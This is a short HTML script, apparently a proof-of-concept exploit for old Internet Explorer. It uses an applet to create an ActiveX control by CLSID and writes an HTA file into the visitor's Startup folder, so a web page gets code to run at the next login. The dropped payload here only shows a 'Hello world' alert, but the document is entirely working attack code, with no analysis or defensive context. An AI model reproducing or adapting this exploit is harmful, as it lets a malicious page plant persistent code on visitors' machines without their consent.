<SCRIPT LANGUAGE="JAVASCRIPT"> 
a1=document.applets[0]; 
fn="..\\\\Start Menu\\\\Programs\\\\Startup\\\\EA.HTA"; 
//fn="EA.HTA"; 
doc="<SCRIPT>s1=\'Hello world\\nTo get rid of this, delete the 
file EA.HTA in Startup 
folder\';alert(s1);document.body.innerHTML=s1</"+"SCRIPT>"; 
function f1() 
{ 
a1.setProperty('DOC',doc); 
} 
function f() 
{ 
// The ActiveX classid 
cl="{06290BD5-48AA-11D2-8432-006008C3FBFC}"; 
a1.setCLSID(cl); 
a1.createInstance(); 
setTimeout("a1.setProperty('Path','"+fn+"')",1000); 
setTimeout("f1()",1500); 
setTimeout("a1.invoke('write',VA);alert('"+fn+" 
created');",2000); 
} 
setTimeout("f()",1000) 
</SCRIPT> 
<SCRIPT LANGUAGE="VBSCRIPT"> 
VA = ARRAY() 
' Just to get something like com.ms.com.Variant[] 
</SCRIPT> 
